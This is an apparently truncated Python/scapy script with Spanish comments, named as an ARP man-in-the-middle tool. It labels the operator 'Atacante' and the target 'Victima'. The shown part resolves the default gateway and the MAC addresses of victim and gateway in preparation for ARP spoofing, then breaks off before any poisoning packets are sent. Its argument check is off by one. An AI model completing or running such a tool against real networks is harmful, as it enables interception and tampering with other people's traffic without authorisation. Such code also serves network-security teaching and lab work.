#!/usr/bin/env python3
import sys, time, signal
from scapy.all import Ether, ARP, srp, send, get_if_hwaddr, conf, get_if_addr

INTERFAZ  = "eth0"
VICTIMA_A = None
INTERVALO = 2
corriendo = True

def gateway_ip():
    return conf.route.route("0.0.0.0")[2]

def salir(sig, frame):
    global corriendo
    print("\n[!] Restaurando y saliendo...")
    corriendo = False

def obtener_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 iface=INTERFAZ, timeout=3, retry=3, verbose=False)
    if not ans:
        return None
    return ans[0][1].hwsrc

def main():
    global INTERFAZ, VICTIMA_A

    if len(sys.argv) < 2:
        print("Uso: sudo python3 02_arp_mitm.py <interfaz> <ip_victima>")
        sys.exit(1)

    INTERFAZ = sys.argv[1]
    VICTIMA_A = sys.argv[2]

    gateway = gateway_ip()
    atacante = get_if_addr(INTERFAZ)

    print(f"Interfaz : {INTERFAZ}")
    print(f"Atacante : {atacante}")
    print(f"Victima  : {VICTIMA_A}")
    print(f"Gateway  : {gateway}")

    mac_a = obtener_mac(VICTIMA_A)
    mac_gw = obtener_mac(gateway)

    if not mac_a:
        print(f"No se pudo resolver la MAC de {VICTIMA_A}")
        sys.exit(1)
    if not mac_gw:
        print(f"No se pudo resolver la MAC del gateway {gateway}")
        sys.exit(1)

    print(f"MAC victima : {mac_a}")
    print(f"MAC gateway : {mac_gw}")
